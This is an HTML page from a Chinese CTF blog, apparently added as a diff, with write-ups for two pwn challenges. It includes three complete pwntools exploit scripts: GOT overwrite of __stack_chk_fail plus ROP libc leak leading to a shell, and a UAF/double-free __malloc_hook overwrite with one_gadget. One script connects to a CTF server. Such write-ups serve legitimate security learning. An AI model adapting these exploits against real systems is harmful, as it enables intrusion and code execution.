@@ -1,0 +1,528 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="学习给自己的">
+    <meta name="description" content="一个小知识点">
+    <meta name="author" content="LOLOLO">
+    
+    <title>
+        
+            陇原战役 PWN |
+        
+        桥下少年
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <link rel="shortcut icon" href="/images/1.jpg">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/css/font-awesome.min.css">
+    <script id="hexo-configurations">
+    let KEEP = window.KEEP || {};
+    KEEP.hexo_config = {"hostname":"lololo-pwn.github.io","root":"/","language":"zh-CN","path":"search.json"};
+    KEEP.theme_config = {"toc":{"enable":true,"number":true,"expand_all":true,"init_open":true},"style":{"primary_color":"#0066CC","avatar":"/images/1.jpg","favicon":"/images/1.jpg","article_img_align":"left","left_side_width":"260px","content_max_width":"920px","hover":{"shadow":true,"scale":false},"first_screen":{"enable":true,"background_img":"/images/bg.svg","description":"不要留恋过去,空想未来,专注当下。"},"scroll":{"progress_bar":{"enable":true},"percent":{"enable":false}}},"local_search":{"enable":true,"preload":true},"code_copy":{"enable":true,"style":"mac"},"pjax":{"enable":false},"lazyload":{"enable":false},"version":"3.4.5"};
+    KEEP.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"};
+  </script>
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+</div>
+
+
+<main class="page-container">
+
+    
+
+    <div class="page-main-content">
+
+        <div class="page-main-content-top">
+            <header class="header-wrapper">
+
+    <div class="header-content">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                桥下少年
+            </a>
+        </div>
+
+        <div class="right">
+            <div class="pc">
+                <ul class="menu-list">
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/"
+                            >
+                                首页
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/archives"
+                            >
+                                归档
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/categories"
+                            >
+                                分类
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/tags"
+                            >
+                                标签
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/links"
+                            >
+                                友链
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/about"
+                            >
+                                关于
+                            </a>
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="fas fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/">首页</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/archives">归档</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/categories">分类</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/tags">标签</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/links">友链</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/about">关于</a>
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle">
+
+            <div class="main-content">
+
+                
+                    <div class="fade-in-down-animation">
+    <div class="article-content-container">
+
+        <div class="article-title">
+            <span class="title-hover-animation">陇原战役 PWN</span>
+        </div>
+
+        
+            <div class="article-header">
+                <div class="avatar">
+                    <img src="/images/1.jpg">
+                </div>
+                <div class="info">
+                    <div class="author">
+                        <span class="name">LOLOLO</span>
+                        
+                            <span class="author-label">Lv2</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fas fa-edit"></i>&nbsp;
+        <span class="pc">2021-11-07 22:55:29</span>
+        <span class="mobile">2021-11-07 22:55</span>
+    </span>
+    
+        <span class="article-categories article-meta-item">
+            <i class="fas fa-folder"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/categories/PWN/">PWN</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fas fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/BUU/">BUU</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+        <span class="article-wordcount article-meta-item">
+            <i class="fas fa-file-word"></i>&nbsp;<span>1.3k 字</span>
+        </span>
+    
+    
+        <span class="article-min2read article-meta-item">
+            <i class="fas fa-clock"></i>&nbsp;<span>6 分钟</span>
+        </span>
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        <div class="article-content markdown-body">
+            <h2 id="PWN1"><a href="#PWN1" class="headerlink" title="PWN1"></a>PWN1</h2><p>保护</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      <span class="function">No <span class="title">PIE</span> <span class="params">(<span class="number">0x3ff000</span>)</span></span></span><br></pre></td></tr></table></figure>
+
+<p>题目IDA打开，就两个主要函数；一个任意地址写函数，一个栈溢出；</p>
+<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>我一开始是通过栈溢出覆盖到文件名处，然后退出程序触发stack_chk_fail，但是一直没找到，触发结束后程序会直接crash怎么处理。比赛结束后看了其他师傅的wp；把stack_chk_fail的got表覆盖为ret地址，这样程序在执行了stack_chk_fail了后不会直接crash掉，而是会继续正常执行；所以方法就变为，覆盖栈的返回地址为puts函数的地址和puts的got表，这样程序在经过stack_chk_fail后会执行put将puts的地址打印出来，获取libc后就简简单单了！</p>
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">from pwn <span class="keyword">import</span> *</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">context</span><span class="params">(log_level=<span class="string">&#x27;debug&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span></span></span><br><span class="line"><span class="function">p </span>= process(<span class="string">&#x27;./pwn1&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn1&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/home/lol/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">put_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">one = [<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf03a4</span>,<span class="number">0xf1247</span>]</span><br><span class="line">ret=<span class="number">0x4005d9</span></span><br><span class="line">rdi =<span class="number">0x400a03</span></span><br><span class="line">rsi = <span class="number">0x400a01</span></span><br><span class="line">start =<span class="number">0x400670</span></span><br><span class="line">rop =flat(rdi,puts_got,put_plt,start)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def read1(addr,cot):</span><br><span class="line">    p.sendlineafter(b<span class="string">&quot;choice\n&quot;</span>,b<span class="string">&quot;0&quot;</span>)</span><br><span class="line">    p.sendlineafter(b<span class="string">&quot;address:\n&quot;</span>,str(addr))</span><br><span class="line">    p.sendafter(b<span class="string">&quot;content:\n&quot;</span>,cot)</span><br><span class="line"></span><br><span class="line">def read2(size,cot):</span><br><span class="line">    p.sendlineafter(b<span class="string">&quot;choice\n&quot;</span>,b<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.sendlineafter(b<span class="string">&quot;size:\n&quot;</span>,str(size))</span><br><span class="line">    p.sendlineafter(b<span class="string">&quot;content:\n&quot;</span>,cot)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;^_^\n&quot;</span>)</span><br><span class="line">read1(<span class="number">0x601020</span>,p64(ret))</span><br><span class="line">read2(<span class="number">320</span>,b<span class="number">&#x27;</span>a<span class="number">&#x27;</span>*<span class="number">280</span>+rop)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;choice\n&quot;</span>,str(ret))</span><br><span class="line">base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,b<span class="number">&#x27;</span>\x00<span class="number">&#x27;</span>))-libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">print(hex(base))</span><br><span class="line">one=flat(base + one[<span class="number">0</span>])</span><br><span class="line">read2(<span class="number">320</span>,b<span class="string">&quot;a&quot;</span>*<span class="number">280</span>+one)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;choice\n&quot;</span>,str(ret))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="exp2-改atoi为system"><a href="#exp2-改atoi为system" class="headerlink" title="exp2   改atoi为system"></a>exp2   改atoi为system</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">from pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="string">&quot;27853&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn1&#x27;</span>,checksec = <span class="number">0</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>,checksec = <span class="number">0</span>)</span><br><span class="line">pop_rdi_ret = <span class="number">0x400a03</span></span><br><span class="line">main_addr = <span class="number">0x40090B</span></span><br><span class="line">canary_check = <span class="number">0x601020</span></span><br><span class="line">atoi_got = <span class="number">0x601040</span></span><br><span class="line">offset = <span class="number">0x110</span> + <span class="number">0x8</span></span><br><span class="line">def chocie(c):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;choice&quot;</span>)</span><br><span class="line">    io.sendline(str(c))</span><br><span class="line">def pwn(size,content):</span><br><span class="line">    chocie(<span class="number">1</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(str(size))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    io.send(content)</span><br><span class="line">def edit_addr(addr,content):</span><br><span class="line">    chocie(<span class="number">0</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    io.sendline(addr)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    io.send(content)</span><br><span class="line">payload = p64(pop_rdi_ret) + p64(elf.got[<span class="string">&quot;puts&quot;</span>])</span><br><span class="line">payload += p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>]) + p64(main_addr)</span><br><span class="line">edit_addr(str(canary_check),p64(main_addr))</span><br><span class="line">pwn(<span class="number">0x150</span>,b<span class="string">&quot;a&quot;</span>*offset + payload)</span><br><span class="line">chocie(<span class="number">5</span>)                      #两次<span class="number">5</span>是为了程序退出，使得<span class="built_in">puts</span>函数能够打印出libc地址</span><br><span class="line">chocie(<span class="number">5</span>)</span><br><span class="line">#leak_libc <span class="keyword">and</span> get shell</span><br><span class="line"><span class="built_in">puts</span> = u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,b<span class="number">&#x27;</span>\x00<span class="number">&#x27;</span>))</span><br><span class="line">libc_base =<span class="built_in">puts</span> - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">edit_addr(str(atoi_got),p64(system))</span><br><span class="line">io.sendline(b<span class="number">&#x27;</span>/bin/sh\x00<span class="number">&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="Magic"><a href="#Magic" class="headerlink" title="Magic"></a>Magic</h2><p>保护如下，这题其实保护没什么用</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>打开IDA看见一堆大数字直接懵逼；比赛的时候也没做出来，赛后看了其他出了的师傅们的，发下这种题需要直接上GDB动调去确定程序的流程；所以上GDB走了几次，发现程序其实就是简单的模板菜单题，只是故意做成这样混淆；</p>
+<h2 id="后续解题思路"><a href="#后续解题思路" class="headerlink" title="后续解题思路"></a>后续解题思路</h2><p>确定程序的流程后</p>
+<ol>
+<li>输入一会创建堆块，大小指定为0x60，且没用写入数据；且该堆块是从unsorted bin 里面切下来的，里面会保留main_arena地址；</li>
+<li>选项二是编辑堆块，没用溢出；但是在最后结束返回时会调用printf函数将当前堆块的内容输出；利用申请堆块不会清空内容，直接将libc地址泄露</li>
+<li>选项三是free操作，存在uaf漏洞</li>
+</ol>
+<p>明白流程后，大概就是先申请两个堆块，然后对第一个堆块进行编辑以此来泄露libc;后面就是简单的将malloc链入到fast bin里面去；这里遇到个问题就是，<strong>在最后一次申请堆块时，如果使用选项一会报错输入非法；看了师傅的wp，发现可以直接利用double free来申请堆块达到get shell</strong></p>
+<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">from pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="meta"># context.log_level = <span class="meta-string">&quot;debug&quot;</span></span></span><br><span class="line"><span class="meta"># io = remote(<span class="meta-string">&quot;node4.buuoj.cn&quot;</span>,27312)</span></span><br><span class="line">io =process(<span class="string">&#x27;./1&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./1&quot;</span>,checksec = <span class="number">0</span>)</span><br><span class="line"><span class="meta"># libc = ELF(<span class="meta-string">&#x27;libc-2.23.so&#x27;</span>,checksec = 0)</span></span><br><span class="line">libc=ELF(<span class="string">&#x27;/home/lol/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so&#x27;</span>,checksec=<span class="number">0</span>)</span><br><span class="line">one = [<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf03a4</span>,<span class="number">0xf1247</span>]</span><br><span class="line">main_arena = <span class="number">0x3c4b20</span></span><br><span class="line">def fuck(index):</span><br><span class="line">    io.recvuntil(b<span class="string">&quot;Input your choice: &quot;</span>)</span><br><span class="line">    io.sendline(str(index))</span><br><span class="line">    io.sendline(b<span class="number">&#x27;0&#x27;</span>)</span><br><span class="line">def add(index):</span><br><span class="line">    fuck(<span class="number">1</span>)</span><br><span class="line">    io.sendline(str(index))</span><br><span class="line">    io.sendline(b<span class="number">&#x27;0&#x27;</span>)</span><br><span class="line">def edit(index,content):</span><br><span class="line">    fuck(<span class="number">2</span>)</span><br><span class="line">    io.recvuntil(b<span class="string">&quot;Input the idx&quot;</span>)</span><br><span class="line">    io.sendline(str(index))</span><br><span class="line">    io.sendline(b<span class="number">&#x27;0&#x27;</span>)</span><br><span class="line">    io.recvuntil(b<span class="string">&quot;Input the Magic&quot;</span>)</span><br><span class="line">    io.send(content)    </span><br><span class="line">def <span class="keyword">delete</span>(index):</span><br><span class="line">    fuck(<span class="number">3</span>)</span><br><span class="line">    io.recvuntil(b<span class="string">&quot;Input the idx&quot;</span>)</span><br><span class="line">    io.sendline(str(index))</span><br><span class="line">    io.sendline(b<span class="number">&#x27;0&#x27;</span>)</span><br><span class="line">#leak_libc</span><br><span class="line">add(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">0</span>,b<span class="string">&quot;a&quot;</span>*<span class="number">8</span>)</span><br><span class="line">libc_base = u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,b<span class="number">&#x27;</span>\x00<span class="number">&#x27;</span>)) - <span class="number">0x3c4d98</span></span><br><span class="line"> </span><br><span class="line"><span class="meta"># print (hex(libc_base))</span></span><br><span class="line"><span class="built_in">realloc</span> = libc_base + libc.sym[<span class="string">&#x27;realloc&#x27;</span>]</span><br><span class="line">malloc_hook = libc_base + libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">success(<span class="string">&quot;malloc_hook: &quot;</span>+hex(malloc_hook))</span><br><span class="line">one_gadget  = one[<span class="number">3</span>] + libc_base</span><br><span class="line"># <span class="meta">#fuck the malloc_hook and libc_realloc</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">delete</span>(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">delete</span>(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(malloc_hook - <span class="number">0x23</span>))</span><br><span class="line">add(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">1</span>)</span><br><span class="line">payload = b<span class="number">&#x27;</span>\x00<span class="number">&#x27;</span>*<span class="number">11</span>+p64(one_gadget)+p64(<span class="built_in">realloc</span>+<span class="number">0x10</span>)</span><br><span class="line">edit(<span class="number">1</span>,payload)</span><br><span class="line"><span class="keyword">delete</span>(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">delete</span>(<span class="number">0</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>两个小收获</p>
+<ol>
+<li>stack_chk_fail的got表改为ret地址后，可以跳过检测，程序可以继续执行</li>
+<li>程序流程复制的题目可以先用GDB动调，方便确定程序的主要流程</li>
+</ol>
+
+        </div>
+
+        
+            <div class="post-copyright-info">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li>本文标题：陇原战役 PWN</li>
+        <li>本文作者：LOLOLO</li>
+        <li>创建时间：2021-11-07 22:55:29</li>
+        <li>
+            本文链接：https://lololo-pwn.github.io/2021/11/07/陇原战役-pwn1/
+        </li>
+        <li>
+            版权声明：本博客所有文章除特别声明外，均采用 <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">BY-NC-SA</a> 许可协议。转载请注明出处！
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+            <ul class="post-tags-box">
+                
+                    <li class="tag-item">
+                        <a href="/tags/BUU/">#BUU</a>&nbsp;
+                    </li>
+                
+            </ul>
+        
+
+        
+            <div class="article-nav">
+                
+                    <div class="article-prev">
+                        <a class="prev"
+                           rel="prev"
+                           href="/2021/11/14/%E8%BF%91%E6%9C%9F%E6%AF%94%E8%B5%9B/"
+                        >
+                            <span class="left arrow-icon flex-center">
+                              <i class="fas fa-chevron-left"></i>
+                            </span>
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">近期比赛记录</span>
+                                <span class="post-nav-item">上一篇</span>
+                            </span>
+                        </a>
+                    </div>
+                
+                
+                    <div class="article-next">
+                        <a class="next"
+                           rel="next"
+                           href="/2021/11/06/houseoforange-hitcon-2016/"
+                        >
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">FSOP经典例题</span>
+                                <span class="post-nav-item">下一篇</span>
+                            </span>
+                            <span class="right arrow-icon flex-center">
+                              <i class="fas fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+        
+    </div>
+</div>
+
+
+                
+            </div>
+
+        </div>
+
+        <div class="page-main-content-bottom">
+            <footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info info-item">
+            &copy;
+            
+              <span>2021</span>
+              -
+            
+            2022&nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;<a href="/">LOLOLO</a>
+        </div>
+        
+            <script async  src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="website-count info-item">
+                
+                    <span id="busuanzi_container_site_uv">
+                        访问人数&nbsp;<span id="busuanzi_value_site_uv"></span>&ensp;
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv">
+                        总访问量&nbsp;<span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="theme-info info-item">
+            由 <a target="_blank" href="https://hexo.io">Hexo</a> 驱动&nbsp;|&nbsp;主题&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.4.5</a>
+        </div>
+        
+        
+    </div>
+</footer>
+
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="tools-item page-aside-toggle">
+                <i class="fas fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-bottom-side-tools">
+        <div class="side-tools-container">
+    <ul class="side-tools-list">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <li class="tools-item tool-expand-width flex-center">
+            <i class="fas fa-arrows-alt-h"></i>
+        </li>
+
+        <li class="tools-item tool-dark-light-toggle flex-center">
+            <i class="fas fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+            <li class="tools-item tool-scroll-to-top flex-center">
+                <i class="fas fa-arrow-up"></i>
+            </li>
+        
+
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list">
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+        
+    </ul>
+</div>
+
+    </div>
+
+    
+        <aside class="page-aside">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#PWN1"><span class="nav-number">1.</span> <span class="nav-text">PWN1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%80%9D%E8%B7%AF"><span class="nav-number">2.</span> <span class="nav-text">思路</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#exp"><span class="nav-number">2.1.</span> <span class="nav-text">exp</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp2-%E6%94%B9atoi%E4%B8%BAsystem"><span class="nav-number">2.2.</span> <span class="nav-text">exp2   改atoi为system</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Magic"><span class="nav-number">3.</span> <span class="nav-text">Magic</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%90%8E%E7%BB%AD%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF"><span class="nav-number">4.</span> <span class="nav-text">后续解题思路</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#exp-1"><span class="nav-number">4.1.</span> <span class="nav-text">exp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">5.</span> <span class="nav-text">总结</span></a></li></ol>
+    </div>
+</div>
+        </aside>
+    
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="搜索..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="popup-btn-close">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+</main>
+
+
+
+<script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/utils.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/main.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/header-shrink.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/back2top.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/dark-light-toggle.js"></script>
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/local-search.js"></script>
+
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/code-copy.js"></script>
+
+
+
+
+<div class="post-scripts">
+    
+        <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/left-side-toggle.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/libs/anime.min.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.5/source/js/toc.js"></script>
+    
+</div>
+
+
+
+</body>
+</html>
